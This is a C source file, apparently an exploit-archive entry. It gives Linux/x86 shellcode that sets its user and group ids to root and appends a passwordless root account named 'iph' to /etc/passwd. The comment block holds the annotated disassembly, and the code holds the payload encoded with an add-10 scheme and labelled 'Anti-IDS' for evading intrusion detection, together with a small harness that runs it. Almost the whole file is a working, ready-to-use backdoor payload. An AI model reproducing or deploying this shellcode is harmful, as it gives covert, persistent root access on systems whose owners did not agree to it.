/*
# Exploit Title: Linux/x86 Polymorphic ShellCode - setuid(0)+setgid(0)+add user 'iph' without password to /etc/passwd
# setuid() - setgid() - open() - write() - close() - exit()
# Date: 30/12/2011
# Author: pentesters.ir
# Tested on: Linux x86 - CentOS 6.0 - 2.6.32-71
# Website: http://pentesters.ir/
# Contact: Cru3l.b0y@gmail.com
# By: Cru3l.b0y
# iph::0:0:IPH:/root:/bin/bash
# This ShellCode is Anti-IDS
# Encode: ADD 10

"\xb0\x17"                  	// mov    $0x17,%al
"\x31\xdb"                  	// xor    %ebx,%ebx
"\xcd\x80"                  	// int    $0x80
"\xb0\x2e"                  	// mov    $0x2e,%al
"\x53"                      	// push   %ebx
"\xcd\x80"                  	// int    $0x80
"\x6a\x05"                   	// push   $0x5
"\x58"                   	    // pop    %eax
"\x31\xc9"                	    // xor    %ecx,%ecx
"\x51"                   	    // push   %ecx
"\x68\x73\x73\x77\x64"       	// push   $0x64777373
"\x68\x2f\x2f\x70\x61"       	// push   $0x61702f2f
"\x68\x2f\x65\x74\x63"       	// push   $0x6374652f
"\x89\xe3"                	    // mov    %esp,%ebx
"\x66\xb9\x01\x04"          	// mov    $0x401,%cx
"\xcd\x80"                  	// int    $0x80
"\x89\xc3"                  	// mov    %eax,%ebx
"\x6a\x04"                  	// push   $0x4
"\x58"                      	// pop    %eax
"\x31\xd2"                  	// xor    %edx,%edx
"\x52"                      	// push   %edx
"\x68\x62\x61\x73\x68"       	// push   $0x68736162
"\x68\x62\x69\x6e\x2f"       	// push   $0x2f6e6962
"\x68\x6f\x74\x3a\x2f"       	// push   $0x2f3a746f
"\x68\x3a\x2f\x72\x6f"       	// push   $0x6f722f3a
"\x68\x3a\x49\x50\x48"       	// push   $0x4850493a
"\x68\x3a\x30\x3a\x30"       	// push   $0x303a303a
"\x68\x69\x70\x68\x3a"       	// push   $0x3a687069
"\x89\xe1"               	    // mov    %esp,%ecx
"\x6a\x1c"                  	// push   $0x1c
"\x5a"                      	// pop    %edx
"\xcd\x80"                  	// int    $0x80
"\x6a\x06"                   	// push   $0x6
"\x58"                      	// pop    %eax
"\xcd\x80"                   	// int    $0x80
"\x6a\x01"                  	// push   $0x1
"\x58"                      	// pop    %eax
"\xcd\x80"                	    // int    $0x80
*/

// ##### ANTI IDS SHELLCODE #####

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

char sc[] =
"\xeb\x11\x5e\x31\xc9\xb1\x64\x80\x6c\x0e\xff\x0a\x80\xe9"
"\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\xba\x21\x3b\xe5"
"\xd7\x8a\xba\x38\x5d\xd7\x8a\x74\x0f\x62\x3b\xd3\x5b\x72"
"\x7d\x7d\x81\x6e\x72\x39\x39\x7a\x6b\x72\x39\x6f\x7e\x6d"
"\x93\xed\x70\xc3\x0b\x0e\xd7\x8a\x93\xcd\x74\x0e\x62\x3b"
"\xdc\x5c\x72\x6c\x6b\x7d\x72\x72\x6c\x73\x78\x39\x72\x79"
"\x7e\x44\x39\x72\x44\x39\x7c\x79\x72\x44\x53\x5a\x52\x72"
"\x44\x3a\x44\x3a\x72\x73\x7a\x72\x44\x93\xeb\x74\x26\x64"
"\xd7\x8a\x74\x10\x62\xd7\x8a\x74\x0b\x62\xd7\x8a";

int main()
{
	int (*fp)() = (int(*)())sc;
    	printf("bytes: %u\n", strlen(sc));
    	fp();
}